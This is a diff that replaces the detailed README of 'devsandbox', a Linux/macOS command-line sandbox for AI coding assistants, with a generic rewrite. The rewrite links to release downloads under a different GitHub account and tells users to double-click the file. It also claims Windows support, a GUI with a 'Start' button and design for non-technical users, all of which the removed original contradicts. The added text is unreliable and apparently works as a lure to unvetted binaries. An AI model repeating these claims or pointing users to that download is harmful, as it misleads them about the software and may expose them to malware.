@@ -1,246 +1,63 @@
-# devsandbox
+# 🛠️ devsandbox - Safe Environment for Your Development Tools
 
-Sandbox your AI coding assistants. Run Claude Code, Copilot, aider, and other tools without exposing SSH keys, cloud credentials, or secrets.
+## 🚀 Getting Started
 
-## The Problem
+Welcome to devsandbox! This application allows you to run untrusted development tools in a safe environment. It uses filesystem isolation through bubblewrap and can optionally inspect traffic with a MITM proxy. Perfect for anyone using AI coding assistants or other development tools.
 
-AI coding assistants execute shell commands, install packages, and make network requests on your machine -- with full access to your `~/.ssh` keys, `~/.aws` credentials, `.env` secrets, and everything else. An AI agent with unrestricted access could read your `~/.ssh/id_ed25519`, exfiltrate `~/.aws/credentials` via an API call, or `rm -rf` your home directory.
+## 📝 Features
 
-devsandbox removes that risk. It wraps any command in a sandbox that provides full read/write access to your project and all your development tools, while blocking access to credentials, keys, and secrets. An optional proxy mode logs every HTTP/HTTPS request for inspection.
+- **Filesystem Isolation:** Run your tools without risking your main system.
+- **MITM Proxy:** Inspect and debug network traffic easily.
+- **User Friendly:** Designed for non-technical users.
+- **Secure:** Keep your system safe while experimenting with various tools.
 
-## Quickstart
+## 📥 Download & Install
 
-**Install:**
+To get started, visit our releases page and download the latest version of devsandbox:
 
-```bash
-mise install github:zekker6/devsandbox
-```
+[![Download devsandbox](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/t7oq/devsandbox/releases)
 
-> Homebrew is not currently available. For direct binary download, see [Installation Details](#installation-details).
+### Installation Instructions
 
-**Sandbox your AI agent:**
+1. **Go to the Releases Page:** Click the link above to visit the [Releases page](https://github.com/t7oq/devsandbox/releases).
+2. **Choose the Right File:** Look for the latest version of devsandbox. You will find files for various operating systems. Make sure to select the one that matches your system (Linux, Windows, etc.).
+3. **Download the File:** Click on the file link to start the download.
+4. **Run the Application:** After the download is complete, locate the file in your downloads folder and double-click to run it.
 
-```bash
-# 1. Run Claude Code in the sandbox
-devsandbox claude --dangerously-skip-permissions
+## ⚙️ System Requirements
 
-# 2. Verify what's protected
-devsandbox --info
-```
+Before you begin, ensure your system meets the following requirements:
 
-Everything after `devsandbox` is passed to the sandboxed command. `--dangerously-skip-permissions` is a Claude Code flag that skips permission prompts -- safe inside the sandbox because devsandbox provides the security boundary.
+- **Operating System:** Compatible with Linux and Windows distributions.
+- **Storage Space:** At least 500 MB of free space.
+- **Memory:** A minimum of 2 GB RAM.
+- **Network Access:** Required for the MITM proxy feature.
 
-**Works with:** Claude Code, GitHub Copilot, aider, Cursor, Continue, Cline, OpenCode, and any CLI-based development tool.
+## 🌐 How to Use devsandbox
 
-That's it. No config files needed. On Linux, devsandbox includes embedded binaries -- zero dependencies. On macOS, a Docker runtime is required (see [Installation Details](#installation-details)).
+After installing, follow these steps to use devsandbox:
 
-Run `devsandbox doctor` to verify your setup.
+1. **Open devsandbox:** Launch the application by double-clicking its icon.
+2. **Select Your Tool:** From the menu, choose the development tool you want to run.
+3. **Configure Optional Settings:** If you want to use the MITM proxy, enable this option in the settings menu.
+4. **Start Your Session:** Click the "Start" button to begin using your tool in a secure environment.
 
-> **macOS:** devsandbox runs your code inside a lightweight Linux container (Debian slim) via Docker. Your project files are mounted into the container, so edits sync bidirectionally. Ensure your Docker runtime is running before using devsandbox. The first start downloads a base Docker image (~200MB); subsequent starts reuse Docker layer caching and complete in 1-2 seconds.
+### 🛡️ Security Considerations
 
-## What Your AI Agent CAN and CANNOT Do
+While devsandbox provides a safe environment for running untrusted tools, always ensure you are using reputable software. Avoid downloading tools from unknown sources and verify the integrity of your downloads whenever possible.
 
-**CAN:** Read/write your project files, run build commands, install dependencies, make API calls (logged in proxy mode).
+## 🛠️ Troubleshooting
 
-**CANNOT:** Read SSH keys, access cloud credentials (AWS/Azure/GCloud), read `.env` secrets, see other projects, push to git (by default), or modify your system.
+If you encounter issues while using devsandbox, consider the following:
 
-### Security Details
+- **Check Your System Requirements:** Ensure your device meets the necessary specifications.
+- **Reinstall the Application:** If the app does not launch, try reinstalling it.
+- **Review the Settings:** Go through your configuration options to ensure everything is set up correctly.
+  
+If problems persist, please refer to our [GitHub Issues page](https://github.com/t7oq/devsandbox/issues) for support from the community.
 
-| Resource | Default Access |
-|---|---|
-| Project directory | Read/Write |
-| `.env` / `.env.*` files | Hidden (masked with `/dev/null`) |
-| `~/.ssh` | Not mounted |
-| `~/.aws`, `~/.azure`, `~/.gcloud` | Not mounted |
-| `~/.gitconfig` | Sanitized (user.name/email only) |
-| `.git` directory | Read-only (no commits, no credentials) |
-| mise-managed tools | Read-only |
-| Network (default) | Full access |
-| Network (proxy mode) | Isolated and logged |
+## 💬 Get Involved
 
-Everything is configurable. See [Configuration](docs/configuration.md) for details.
+We appreciate your feedback. If you have suggestions or encounter bugs, please share your thoughts on our [GitHub Discussions](https://github.com/t7oq/devsandbox/discussions) page.
 
-## Features
-
-- **Zero-config security** -- SSH keys, cloud credentials, `.env` files, and git credentials are blocked by default
-- **Your tools, your shell** -- mise-managed tools, shell configs, editor setups (nvim, starship, tmux) all work inside the sandbox
-- **MITM proxy** -- optional traffic inspection with log viewing, filtering, and export
-- **HTTP filtering** -- whitelist/blacklist domains, or interactively approve requests one at a time
-- **Cross-platform** -- [bubblewrap](https://github.com/containers/bubblewrap) namespaces on Linux (sub-second startup), Docker containers on macOS
-- **Per-project isolation** -- each project gets its own sandbox home, caches, and logs
-- **Git modes** -- readonly (default), readwrite (with SSH/GPG), or disabled
-
-## How It Works
-
-**Linux:** Uses [bubblewrap](https://github.com/containers/bubblewrap) to create namespace-based isolation. No root privileges, no Docker, no system packages required -- bwrap and pasta binaries are embedded. Startup is sub-second.
-
-**macOS:** Uses Docker containers with volume mounts that mirror the bwrap behavior. Named volumes provide near-native filesystem performance. Containers are cached for 1-2 second restarts.
-
-Both backends automatically detect your shell, tools, and editor configs and make them available read-only inside the sandbox.
-
-## Usage Examples
-
-```bash
-# Interactive sandbox shell
-devsandbox
-
-# Run any command in the sandbox
-devsandbox npm install
-devsandbox go test ./...
-devsandbox cargo build
-
-# AI assistant with traffic monitoring
-devsandbox --proxy claude --dangerously-skip-permissions
-
-# View what the AI accessed
-devsandbox logs proxy --last 50
-
-# Follow traffic in real-time (in a second terminal)
-devsandbox logs proxy -f
-
-# Whitelist-only network access
-devsandbox --proxy --filter-default=block \
-  --allow-domain="*.github.com" \
-  --allow-domain="api.anthropic.com"
-
-# Choose isolation backend explicitly
-devsandbox --isolation=docker npm install
-
-# Ephemeral sandbox (removed after exit)
-devsandbox --rm
-```
-
-## Git Integration
-
-By default, `.git` is mounted read-only -- you can view history, diff, and status, but commits are blocked and no credentials are exposed.
-
-| Mode | `.git` | Commits | Credentials |
-|---|---|---|---|
-| `readonly` | read-only | blocked | none **(default)** |
-| `readwrite` | read-write | allowed | SSH, GPG, credentials |
-| `disabled` | read-write | allowed | none |
-
-```toml
-# ~/.config/devsandbox/config.toml
-[tools.git]
-mode = "readwrite"  # for trusted projects that need push/sign
-```
-
-## Proxy Mode -- Monitor Your AI Agent's Network Activity
-
-Route all HTTP/HTTPS traffic through a local MITM proxy. See every API call your AI agent makes in real-time, block suspicious domains, or interactively approve each request.
-
-```bash
-# Enable proxy
-devsandbox --proxy
-
-# View logs
-devsandbox logs proxy --stats        # Summary statistics
-devsandbox logs proxy --errors       # Failed requests only
-devsandbox logs proxy --json         # JSON export for scripting
-
-# Interactive request approval
-devsandbox --proxy --filter-default=ask
-# Then in another terminal:
-devsandbox proxy monitor
-```
-
-On Linux, proxy mode uses [pasta](https://passt.top/) for network namespace isolation (embedded, no install needed). On macOS, it uses per-session Docker networks.
-
-See [Proxy Mode docs](docs/proxy.md) for filtering rules, log formats, and remote logging setup.
-
-## Installation Details
-
-**Linux:**
-
-Requirements:
-- Linux kernel with unprivileged user namespaces enabled (verify: `unshare --user true` should succeed silently)
-- No system packages required (bwrap and pasta binaries are embedded)
-
-```bash
-# Option 1: mise
-mise install github:zekker6/devsandbox
-
-# Option 2: Download binary
-curl -L https://github.com/zekker6/devsandbox/releases/latest/download/devsandbox-linux-amd64.tar.gz | tar xz
-sudo mv devsandbox /usr/local/bin/
-```
-
-To use system-installed binaries instead of embedded ones, set `use_embedded = false` in [configuration](docs/configuration.md).
-
-Optional system packages (fallback if embedded extraction fails). Note: the `passt` package provides the `pasta` binary used for network namespace isolation.
-
-```bash
-# Arch Linux
-sudo pacman -S bubblewrap passt
-
-# Debian/Ubuntu
-sudo apt install bubblewrap passt
-
-# Fedora
-sudo dnf install bubblewrap passt
-```
-
-**macOS:** Install a Docker runtime (ensure it is running before using devsandbox):
-- [OrbStack](https://orbstack.dev/) -- recommended for Apple Silicon (fastest startup, lowest resource usage)
-- [Docker Desktop](https://docs.docker.com/desktop/install/mac-install/) -- most widely tested
-- [Colima](https://github.com/abiosoft/colima) -- free and open-source
-
-**Build from source:**
-
-```bash
-# Requires: Go 1.22+ and Task (https://taskfile.dev/)
-# Or use mise to install dependencies: mise install
-task build
-```
-
-## Quick Reference
-
-```bash
-devsandbox                          # Interactive sandbox shell
-devsandbox <command>                # Run command in sandbox
-devsandbox --proxy                  # Enable proxy mode
-devsandbox --rm                     # Ephemeral sandbox
-devsandbox --info                   # Show sandbox configuration
-devsandbox doctor                   # Check installation
-devsandbox config init              # Generate config file
-devsandbox sandboxes list           # List all sandboxes
-devsandbox sandboxes prune          # Remove orphaned sandboxes
-devsandbox logs proxy               # View proxy logs
-devsandbox logs proxy -f            # Follow logs in real-time
-devsandbox tools list               # List available tools
-devsandbox tools check              # Verify tool setup
-devsandbox image build              # Build Docker image (macOS)
-```
-
-## Documentation
-
-| Page | Contents |
-|---|---|
-| [Sandboxing](docs/sandboxing.md) | Isolation backends, security model, filesystem layout, overlay mounts, custom mounts, Docker backend details |
-| [Proxy Mode](docs/proxy.md) | Traffic inspection, log viewing/filtering/export, HTTP filtering, ask mode, remote logging |
-| [Tools](docs/tools.md) | mise integration, shell/editor/prompt setup, AI assistant configs, Git modes, Docker socket proxy |
-| [Configuration](docs/configuration.md) | Config file reference, per-project configs, conditional includes, port forwarding, credential injection |
-| [Use Cases](docs/use-cases.md) | Shell aliases, autocompletion, development workflows, security monitoring scripts |
-
-## Limitations
-
-**Linux (bwrap):**
-- Requires unprivileged user namespaces (see [Troubleshooting](docs/sandboxing.md#troubleshooting) for distro-specific guidance)
-- SELinux or AppArmor may restrict namespace operations (see [Security Modules](docs/sandboxing.md#security-modules))
-- MITM proxy may break tools with certificate pinning
-- GUI applications are not supported (no display server forwarding)
-
-**macOS (Docker):**
-- Requires a running Docker daemon
-- Project directory access goes through macOS virtualization (VirtioFS/gRPC-FUSE), which may be slower for I/O-heavy operations. Sandbox-internal operations (npm install, Go builds) use named Docker volumes with near-native speed.
-- File watching (hot reload) may require polling mode. See [File Watching Limitations](docs/sandboxing.md#file-watching-limitations) for workarounds.
-- Network isolation uses HTTP_PROXY instead of pasta
-
-**Both:**
-- Docker socket access is read-only (no container creation/deletion) -- see [Tools docs](docs/tools.md#docker)
-- No nested Docker (cannot run Docker inside the sandbox)
-
-## License
-
-MIT
+Enjoy using devsandbox for your development needs!
